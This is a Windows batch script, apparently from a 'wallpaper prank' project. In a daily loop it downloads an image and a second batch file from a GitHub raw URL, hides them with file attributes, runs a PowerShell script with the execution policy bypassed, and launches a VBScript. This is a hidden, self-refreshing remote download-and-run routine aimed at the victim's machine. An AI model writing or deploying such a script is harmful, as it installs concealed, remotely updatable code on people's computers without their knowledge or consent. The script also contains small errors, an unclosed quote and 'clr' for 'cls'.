@echo off
:start
powershell -command "Start-Sleep -s 333"

IF EXIST icon.jpg ( 
attrib icon.jpg -h
)

curl https://raw.githubusercontent.com/Gitwiebel/Wallpaper_prnk/main/icontest.jpg --ssl-no-revoke -o "%cd%"/icon.jpg

IF EXIST icon.jpg ( 
attrib icon.jpg +h
)

IF EXIST crash_log.bat ( 
attrib crash_log.bat -h
)

curl https://raw.githubusercontent.com/Gitwiebel/Wallpaper_prnk/main/crash_log.bat --ssl-no-revoke -o "%cd%"/crash_log.bat

IF EXIST crash_log.bat ( 
attrib crash_log.bat +h
)

powershell -ExecutionPolicy ByPass -File ResetDefault.ps1
debug.vbs

set mydate=%date%

:loop
IF "%date%"=="%mydate%" ( ECHO "yes"
powershell -command "Start-Sleep -s 3600
clr
Goto:loop
)
IF NOT "%date%"=="%mydate%" ( ECHO "NO"
goto:start
)